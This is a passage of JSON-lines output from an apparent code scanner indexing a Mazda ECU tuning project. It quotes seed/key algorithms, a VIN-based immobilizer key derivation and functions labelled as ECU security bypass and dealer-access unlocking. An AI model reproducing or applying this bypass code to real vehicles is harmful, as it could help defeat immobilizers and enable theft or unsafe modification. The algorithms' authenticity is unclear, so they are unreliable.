"content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1) ->"}, {"type": "algorithm_function", "line": 88, "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1"}, {"type": "algorithm_function", "line": 108, "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = "}, {"type": "algorithm_function", "line": 119, "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}], "protocols": [{"type": "protocol", "line": 16, "protocol": "0x[0-9A-Fa-f]+", "content": "ENGINE_ECU = 0x01"}, {"type": "protocol", "line": 17, "protocol": "0x[0-9A-Fa-f]+", "content": "TRANSMISSION = 0x02"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "IMMOBILIZER = 0x03"}, {"type": "protocol", "line": 19, "protocol": "0x[0-9A-Fa-f]+", "content": "BODY_CONTROL = 0x04"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "ABS = 0x05"}, {"type": "protocol", "line": 21, "protocol": "0x[0-9A-Fa-f]+", "content": "AIRBAG = 0x06"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "INSTRUMENT_CLUSTER = 0x07"}, {"type": "protocol", "line": 23, "protocol": "0x[0-9A-Fa-f]+", "content": "GATEWAY = 0x08"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = seed[i] ^ 0x73"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i) & 0xFF"}, {"type": "protocol", "line": 84, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ 0xA9"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "1: 0x10,"}, {"type": "protocol", "line": 94, "protocol": "0x[0-9A-Fa-f]+", "content": "2: 0x20,"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "3: 0x30,"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "4: 0x40,"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "5: 0x50,"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "6: 0x60"}, {"type": "protocol", "line": 99, "protocol": "0x[0-9A-Fa-f]+", "content": "}.get(security_level, 0x10)"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (seed[i] ^ 0x5A) + level_factor"}, {"type": "protocol", "line": 102, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((temp << 4) | (temp >> 4)) & 0xFF"}, {"type": "protocol", "line": 103, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = temp ^ [0x37, 0x92, 0x64, 0xA8][i]"}, {"type": "protocol", "line": 104, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + i * 2) & 0xFF"}, {"type": "protocol", "line": 105, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = ~temp & 0xFF"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "Mazda ECU seed/key helpers for diagnostic security access"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "class MazdaECUType(IntEnum):"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "ENGINE_ECU = 0x01"}, {"type": "hardware", "line": 18, "hardware": "immobilizer", "content": "IMMOBILIZER = 0x03"}, {"type": "hardware", "line": 20, "hardware": "ABS", "content": "ABS = 0x05"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "Seed-key helper database for Mazda ECUs"}, {"type": "hardware", "line": 33, "hardware": "ECU", "content": "self.ecu_database = self._initialize_ecu_database()"}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "\"ENGINE_ECU_2011\": self._algorithm_engine_ecu_2011,"}, {"type": "hardware", "line": 39, "hardware": "immobilizer", "content": "\"IMMOBILIZER_2011\": self._algorithm_immobilizer_2011,"}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "def _initialize_ecu_database(self) -> Dict[MazdaECUType, Dict[str, any]]:"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "MazdaECUType.ENGINE_ECU: {"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "\"algorithm\": \"ENGINE_ECU_2011\","}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "\"security_levels\": [1, 2, 3, 4, 5, 6],"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "MazdaECUType.IMMOBILIZER: {"}, {"type": "hardware", "line": 51, "hardware": "immobilizer", "content": "MazdaECUType.IMMOBILIZER: {"}, {"type": "hardware", "line": 52, "hardware": "immobilizer", "content": "\"algorithm\": \"IMMOBILIZER_2011\","}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "\"security_levels\": [5],"}, {"type": "hardware", "line": 61, "hardware": "ECU", "content": "vin: Optional[str] = None, security_level: int = 1) -> Optional[bytes]:"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1) ->"}, {"type": "hardware", "line": 88, "hardware": "ECU", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "hardware", "line": 99, "hardware": "ECU", "content": "}.get(security_level, 0x10)"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = "}, {"type": "hardware", "line": 108, "hardware": "immobilizer", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = "}, {"type": "hardware", "line": 110, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "hardware", "line": 112, "hardware": "immobilizer", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "hardware", "line": 113, "hardware": "immobilizer", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 113, "hardware": "vehicle", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "hardware", "line": 114, "hardware": "vehicle", "content": "des_key = vehicle_key[:24]"}, {"type": "hardware", "line": 119, "hardware": "immobilizer", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "hardware", "line": 122, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "hardware", "line": 123, "hardware": "immobilizer", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "hardware", "line": 127, "hardware": "ECU", "content": "def bypass_security():"}, {"type": "hardware", "line": 131, "hardware": "ECU", "content": "logging.info(\"Attempting to bypass ECU security...\")"}, {"type": "hardware", "line": 133, "hardware": "ECU", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "hardware", "line": 135, "hardware": "ECU", "content": "if ecu_info:"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "algorithm_name = ecu_info[\"algorithm\"]"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "seed_length = ecu_info[\"seed_length\"]"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "logging.info(f\"Calculating key for ENGINE_ECU using {algorithm_name}\")"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.IMMOBILIZER)"}, {"type": "hardware", "line": 146, "hardware": "immobilizer", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.IMMOBILIZER)"}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "if ecu_info:"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "algorithm_name = ecu_info[\"algorithm\"]"}, {"type": "hardware", "line": 149, "hardware": "ECU", "content": "seed_length = ecu_info[\"seed_length\"]"}, {"type": "hardware", "line": 152, "hardware": "immobilizer", "content": "logging.info(f\"Calculating key for IMMOBILIZER using {algorithm_name}\")"}, {"type": "hardware", "line": 155, "hardware": "immobilizer", "content": "logging.info(f\"Successfully calculated key for immobilizer: {key.hex().upper()}\")"}, {"type": "hardware", "line": 157, "hardware": "immobilizer", "content": "logging.error(\"Failed to calculate key for immobilizer.\")"}, {"type": "hardware", "line": 160, "hardware": "ECU", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}], "security_logic": [{"type": "security_pattern", "line": 2, "pattern": "key", "content": "Mazda ECU seed/key helpers for diagnostic security access"}, {"type": "security_pattern", "line": 2, "pattern": "seed", "content": "Mazda ECU seed/key helpers for diagnostic security access"}, {"type": "security_pattern", "line": 5, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 9, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 9, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 26, "pattern": "key", "content": "class MazdaSeedKeyDatabase:"}, {"type": "security_pattern", "line": 26, "pattern": "seed", "content": "class MazdaSeedKeyDatabase:"}, {"type": "security_pattern", "line": 28, "pattern": "key", "content": "Seed-key helper database for Mazda ECUs"}, {"type": "security_pattern", "line": 28, "pattern": "seed", "content": "Seed-key helper database for Mazda ECUs"}, {"type": "security_pattern", "line": 32, "pattern": "algorithm", "content": "self.algorithm_database = self._initialize_algorithm_database()"}, {"type": "security_pattern", "line": 35, "pattern": "algorithm", "content": "def _initialize_algorithm_database(self) -> Dict[str, Callable]:"}, {"type": "security_pattern", "line": 37, "pattern": "algorithm", "content": "\"ALG_27_STANDARD\": self._algorithm_27_standard,"}, {"type": "security_pattern", "line": 38, "pattern": "algorithm", "content": "\"ENGINE_ECU_2011\": self._algorithm_engine_ecu_2011,"}, {"type": "security_pattern", "line": 39, "pattern": "algorithm", "content": "\"IMMOBILIZER_2011\": self._algorithm_immobilizer_2011,"}, {"type": "security_pattern", "line": 45, "pattern": "algorithm", "content": "\"algorithm\": \"ENGINE_ECU_2011\","}, {"type": "security_pattern", "line": 46, "pattern": "seed", "content": "\"seed_length\": 4,"}, {"type": "security_pattern", "line": 47, "pattern": "key", "content": "\"key_length\": 4,"}, {"type": "security_pattern", "line": 52, "pattern": "algorithm", "content": "\"algorithm\": \"IMMOBILIZER_2011\","}, {"type": "security_pattern", "line": 53, "pattern": "seed", "content": "\"seed_length\": 8,"}, {"type": "security_pattern", "line": 54, "pattern": "key", "content": "\"key_length\": 8,"}, {"type": "security_pattern", "line": 60, "pattern": "key", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 60, "pattern": "seed", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 60, "pattern": "algorithm", "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "if algorithm_name not in self.algorithm_database:"}, {"type": "security_pattern", "line": 64, "pattern": "algorithm", "content": "logger.error(f\"Unknown algorithm: {algorithm_name}\")"}, {"type": "security_pattern", "line": 66, "pattern": "algorithm", "content": "algorithm = self.algorithm_database[algorithm_name]"}, {"type": "security_pattern", "line": 67, "pattern": "key", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 67, "pattern": "seed", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 67, "pattern": "algorithm", "content": "key = algorithm(seed, vin, security_level)"}, {"type": "security_pattern", "line": 68, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 69, "pattern": "key", "content": "logger.debug(f\"Calculated key using {algorithm_name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 69, "pattern": "algorithm", "content": "logger.debug(f\"Calculated key using {algorithm_name}: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 71, "pattern": "key", "content": "logger.error(f\"Algorithm {algorithm_name} returned no key\")"}, {"type": "security_pattern", "line": 71, "pattern": "algorithm", "content": "logger.error(f\"Algorithm {algorithm_name} returned no key\")"}, {"type": "security_pattern", "line": 72, "pattern": "key", "content": "return key"}, {"type": "security_pattern", "line": 74, "pattern": "key", "content": "logger.error(f\"Error calculating key with {algorithm_name}: {e}\")"}, {"type": "security_pattern", "line": 74, "pattern": "algorithm", "content": "logger.error(f\"Error calculating key with {algorithm_name}: {e}\")"}, {"type": "security_pattern", "line": 77, "pattern": "seed", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1) ->"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "def _algorithm_27_standard(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1) ->"}, {"type": "security_pattern", "line": 78, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 79, "pattern": "seed", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 79, "pattern": "algorithm", "content": "raise ValueError(\"Standard algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 82, "pattern": "seed", "content": "temp = seed[i] ^ 0x73"}, {"type": "security_pattern", "line": 85, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 86, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 88, "pattern": "seed", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1"}, {"type": "security_pattern", "line": 88, "pattern": "algorithm", "content": "def _algorithm_engine_ecu_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = 1"}, {"type": "security_pattern", "line": 89, "pattern": "seed", "content": "if len(seed) != 4:"}, {"type": "security_pattern", "line": 90, "pattern": "seed", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 90, "pattern": "algorithm", "content": "raise ValueError(\"Engine ECU algorithm requires 4-byte seed\")"}, {"type": "security_pattern", "line": 91, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 101, "pattern": "seed", "content": "temp = (seed[i] ^ 0x5A) + level_factor"}, {"type": "security_pattern", "line": 105, "pattern": "key", "content": "key[i] = ~temp & 0xFF"}, {"type": "security_pattern", "line": 106, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 108, "pattern": "seed", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = "}, {"type": "security_pattern", "line": 108, "pattern": "algorithm", "content": "def _algorithm_immobilizer_2011(self, seed: bytes, vin: Optional[str] = None, security_level: int = "}, {"type": "security_pattern", "line": 109, "pattern": "seed", "content": "if len(seed) != 8:"}, {"type": "security_pattern", "line": 110, "pattern": "seed", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 110, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires 8-byte seed\")"}, {"type": "security_pattern", "line": 112, "pattern": "algorithm", "content": "raise ValueError(\"Immobilizer algorithm requires VIN\")"}, {"type": "security_pattern", "line": 113, "pattern": "key", "content": "vehicle_key = self._derive_immobilizer_key(vin)"}, {"type": "security_pattern", "line": 114, "pattern": "key", "content": "des_key = vehicle_key[:24]"}, {"type": "security_pattern", "line": 115, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 115, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 115, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(des_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 116, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 116, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 117, "pattern": "encrypt", "content": "return encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 117, "pattern": "seed", "content": "return encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 119, "pattern": "key", "content": "def _derive_immobilizer_key(self, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 121, "pattern": "key", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 121, "pattern": "hash", "content": "key = hashlib.md5(vin_bytes).digest()"}, {"type": "security_pattern", "line": 122, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 122, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_1').digest()"}, {"type": "security_pattern", "line": 123, "pattern": "key", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 123, "pattern": "hash", "content": "key = hashlib.sha256(key + b'mazda_immobilizer_salt_2').digest()"}, {"type": "security_pattern", "line": 124, "pattern": "key", "content": "return key[:24]"}, {"type": "security_pattern", "line": 129, "pattern": "key", "content": "Demonstrates calculating keys for dealer-level access."}, {"type": "security_pattern", "line": 132, "pattern": "key", "content": "seed_key_db = MazdaSeedKeyDatabase()"}, {"type": "security_pattern", "line": 132, "pattern": "seed", "content": "seed_key_db = MazdaSeedKeyDatabase()"}, {"type": "security_pattern", "line": 133, "pattern": "key", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "security_pattern", "line": 133, "pattern": "seed", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "security_pattern", "line": 136, "pattern": "algorithm", "content": "algorithm_name = ecu_info[\"algorithm\"]"}, {"type": "security_pattern", "line": 137, "pattern": "seed", "content": "seed_length = ecu_info[\"seed_length\"]"}, {"type": "security_pattern", "line": 138, "pattern": "seed", "content": "seed = b'\\xDE\\xAD\\xBE\\xEF'[:seed_length]"}, {"type": "security_pattern", "line": 139, "pattern": "key", "content": "logging.info(f\"Calculating key for ENGINE_ECU using {algorithm_name}\")"}, {"type": "security_pattern", "line": 139, "pattern": "algorithm", "content": "logging.info(f\"Calculating key for ENGINE_ECU using {algorithm_name}\")"}, {"type": "security_pattern", "line": 140, "pattern": "key", "content": "key = seed_key_db.calculate_key(seed, algorithm_name)"}, {"type": "security_pattern", "line": 140, "pattern": "seed", "content": "key = seed_key_db.calculate_key(seed, algorithm_name)"}, {"type": "security_pattern", "line": 140, "pattern": "algorithm", "content": "key = seed_key_db.calculate_key(seed, algorithm_name)"}, {"type": "security_pattern", "line": 141, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 142, "pattern": "key", "content": "logging.info(f\"Successfully calculated key: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 144, "pattern": "key", "content": "logging.error(\"Failed to calculate key.\")"}, {"type": "security_pattern", "line": 146, "pattern": "key", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.IMMOBILIZER)"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "ecu_info = seed_key_db.ecu_database.get(MazdaECUType.IMMOBILIZER)"}, {"type": "security_pattern", "line": 148, "pattern": "algorithm", "content": "algorithm_name = ecu_info[\"algorithm\"]"}, {"type": "security_pattern", "line": 149, "pattern": "seed", "content": "seed_length = ecu_info[\"seed_length\"]"}, {"type": "security_pattern", "line": 150, "pattern": "seed", "content": "seed = b'\\xDE\\xAD\\xBE\\xEF\\xDE\\xAD\\xBE\\xEF'[:seed_length]"}, {"type": "security_pattern", "line": 152, "pattern": "key", "content": "logging.info(f\"Calculating key for IMMOBILIZER using {algorithm_name}\")"}, {"type": "security_pattern", "line": 152, "pattern": "algorithm", "content": "logging.info(f\"Calculating key for IMMOBILIZER using {algorithm_name}\")"}, {"type": "security_pattern", "line": 153, "pattern": "key", "content": "key = seed_key_db.calculate_key(seed, algorithm_name, vin=vin)"}, {"type": "security_pattern", "line": 153, "pattern": "seed", "content": "key = seed_key_db.calculate_key(seed, algorithm_name, vin=vin)"}, {"type": "security_pattern", "line": 153, "pattern": "algorithm", "content": "key = seed_key_db.calculate_key(seed, algorithm_name, vin=vin)"}, {"type": "security_pattern", "line": 154, "pattern": "key", "content": "if key:"}, {"type": "security_pattern", "line": 155, "pattern": "key", "content": "logging.info(f\"Successfully calculated key for immobilizer: {key.hex().upper()}\")"}, {"type": "security_pattern", "line": 157, "pattern": "key", "content": "logging.error(\"Failed to calculate key for immobilizer.\")"}, {"type": "security_pattern", "line": 160, "pattern": "key", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}, {"type": "security_pattern", "line": 160, "pattern": "seed", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts", "security"]}
{"file_path": "muts/services/__init__.py", "lines_read": 9, "features_found": [{"type": "import", "module": ".ai_tuner", "line": null}, {"type": "import", "module": ".physics_engine", "line": null}, {"type": "import", "module": ".dealer_service", "line": null}, {"type": "import", "module": ".performance_features", "line": null}, {"type": "import", "module": "AITuningSystem", "line": null}, {"type": "import", "module": "TurbochargerPhysics,", "line": null}, {"type": "import", "module": "MazdaDealerSecurity", "line": null}, {"type": "import", "module": "AdvancedPerformanceManager,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 7, "hardware": "ECU", "content": "from .dealer_service import MazdaDealerSecurity"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/services/ai_tuner.py", "lines_read": 476, "features_found": [{"type": "function", "name": "__init__", "line": 19}, {"type": "function", "name": "forward", "line": 35}, {"type": "function", "name": "__init__", "line": 41}, {"type": "function", "name": "remember", "line": 58}, {"type": "function", "name": "act", "line": 62}, {"type": "function", "name": "replay", "line": 71}, {"type": "function", "name": "__init__", "line": 115}, {"type": "function", "name": "_initialize_tuning_rules", "line": 135}, {"type": "function", "name": "real_time_optimization", "line": 161}, {"type": "function", "name": "_create_state_vector", "line": 186}, {"type": "function", "name": "_get_ai_adjustments", "line": 204}, {"type": "function", "name": "_apply_expert_rules", "line": 220}, {"type": "function", "name": "_optimize_boost_spool", "line": 241}, {"type": "function", "name": "_optimize_ignition_timing", "line": 266}, {"type": "function", "name": "_optimize_vvt_timing", "line": 307}, {"type": "function", "name": "_optimize_afr", "line": 327}, {"type": "function", "name": "_combine_adjustments", "line": 351}, {"type": "function", "name": "_apply_safety_limits", "line": 369}, {"type": "function", "name": "_learn_from_optimization", "line": 398}, {"type": "function", "name": "_calculate_reward", "line": 416}, {"type": "function", "name": "_adjustments_to_action", "line": 442}, {"type": "function", "name": "save_models", "line": 463}, {"type": "function", "name": "load_models", "line": 470}, {"type": "import", "module": "sklearn.ensemble", "line": null}, {"type": "import", "module": "sklearn.preprocessing", "line": null}, {"type": "import", "module": "collections", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "torch", "line": null}, {"type": "import", "module": "torch.nn", "line": null}, {"type": "import", "module": "torch.optim", "line": null}, {"type": "import", "module": "RandomForestRegressor", "line": null}, {"type": "import", "module": "StandardScaler", "line": null}, {"type": "import", "module": "joblib", "line": null}, {"type": "import", "module": "deque", "line": null}, {"type": "import", "module": "random", "line": null}], "components_found": [{"type": "class", "name": "AITuningNetwork", "line": 16}, {"type": "class", "name": "ReinforcementTuner", "line": 38}, {"type": "class", "name": "AITuningSystem", "line": 112}], "algorithms": [{"type": "algorithm_function", "line": 416, "content": "def _calculate_reward(self, data, adjustments):"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 194, "hardware": "ABS", "content": "abs(data['knock_retard']) / 8.0,         # Normalized knock"}, {"type": "hardware", "line": 302, "hardware": "ABS", "content": "if abs(base_timing_adj) > 0.1:"}], "security_logic": [{"type": "security_pattern", "line": 359, "pattern": "key", "content": "for key, ai_value in ai_adjustments.items():"}, {"type": "security_pattern", "line": 360, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 362, "pattern": "key", "content": "combined[key] = 0.7 * combined[key] + 0.3 * ai_value"}, {"type": "security_pattern", "line": 365, "pattern": "key", "content": "combined[key] = ai_value * 0.5"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/services/dealer_service.py", "lines_read": 420, "features_found": [{"type": "function", "name": "__init__", "line": 24}, {"type": "function", "name": "_initialize_dealer_codes", "line": 35}, {"type": "function", "name": "_initialize_security_levels", "line": 48}, {"type": "function", "name": "_initialize_diagnostic_procedures", "line": 73}, {"type": "function", "name": "perform_security_access", "line": 102}, {"type": "function", "name": "_execute_security_sequence", "line": 134}, {"type": "function", "name": "execute_dealer_command", "line": 182}, {"type": "function", "name": "clear_all_adaptations", "line": 211}, {"type": "function", "name": "reset_to_factory_calibration", "line": 239}, {"type": "function", "name": "unlock_engineering_parameters", "line": 259}, {"type": "function", "name": "enable_engineering_mode", "line": 287}, {"type": "function", "name": "read_factory_data", "line": 308}, {"type": "function", "name": "write_dealer_calibration", "line": 339}, {"type": "function", "name": "get_security_status", "line": 375}, {"type": "function", "name": "_calculate_access_time_remaining", "line": 384}, {"type": "function", "name": "validate_dealer_code", "line": 392}, {"type": "function", "name": "generate_session_key", "line": 396}, {"type": "function", "name": "verify_session_integrity", "line": 402}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "muts.security", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "hmac", "line": null}, {"type": "import", "module": "secrets", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "MazdaECUType,", "line": null}, {"type": "import", "module": "secrets", "line": null}], "components_found": [{"type": "class", "name": "MazdaDealerSecurity", "line": 18}], "algorithms": [{"type": "algorithm_function", "line": 384, "content": "def _calculate_access_time_remaining(self) -> str:"}], "protocols": [{"type": "protocol", "line": 77, "protocol": "0x[0-9A-Fa-f]+", "content": "'service': 0x27,"}, {"type": "protocol", "line": 78, "protocol": "0x[0-9A-Fa-f]+", "content": "'sequence': [0x01, 0x02],  # Request seed, send key"}, {"type": "protocol", "line": 83, "protocol": "0x[0-9A-Fa-f]+", "content": "'service': 0x23,"}, {"type": "protocol", "line": 85, "protocol": "0x[0-9A-Fa-f]+", "content": "'max_size': 0x1000"}, {"type": "protocol", "line": 88, "protocol": "0x[0-9A-Fa-f]+", "content": "'service': 0x3D,"}, {"type": "protocol", "line": 93, "protocol": "0x[0-9A-Fa-f]+", "content": "'service': 0x31,"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "'start': 0x01,"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "'stop': 0x02,"}, {"type": "protocol", "line": 97, "protocol": "0x[0-9A-Fa-f]+", "content": "'request_results': 0x03"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "DEALERSHIP SECURITY AND DIAGNOSTIC SERVICES"}, {"type": "hardware", "line": 15, "hardware": "ECU", "content": "from muts.security import MazdaECUType, MazdaSeedKeyDatabase"}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "class MazdaDealerSecurity:"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "COMPLETE MAZDA DEALERSHIP SECURITY AND DIAGNOSTIC ACCESS"}, {"type": "hardware", "line": 21, "hardware": "ECU", "content": "Implements factory dealer tools and security bypass methods"}, {"type": "hardware", "line": 26, "hardware": "ECU", "content": "self.security_levels = self._initialize_security_levels()"}, {"type": "hardware", "line": 28, "hardware": "ECU", "content": "self.current_security_level = 'user'"}, {"type": "hardware", "line": 31, "hardware": "ECU", "content": "self.security_keys = {}"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "self.current_security_key = None"}, {"type": "hardware", "line": 33, "hardware": "vehicle", "content": "self.vehicle_vin = \"JM1BK123456789012\""}, {"type": "hardware", "line": 42, "hardware": "ECU", "content": "'security_reset': 'SEC-RES-MAZDA-2024',"}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "def _initialize_security_levels(self) -> Dict[str, Dict]:"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "\"\"\"Initialize security access levels and capabilities\"\"\""}, {"type": "hardware", "line": 63, "hardware": "ECU", "content": "'capabilities': ['dealer'] + ['factory_calibration', 'security_bypass', 'engineering_mode'],"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "'capabilities': ['manufacturer'] + ['full_ecu_access', 'parameter_modification', 'debug_mode'],"}, {"type": "hardware", "line": 76, "hardware": "ECU", "content": "'security_access': {"}, {"type": "hardware", "line": 102, "hardware": "ECU", "content": "def perform_security_access(self, access_level: str) -> str:"}, {"type": "hardware", "line": 104, "hardware": "ECU", "content": "Perform security access procedure to gain dealer-level access"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "if access_level not in self.security_levels:"}, {"type": 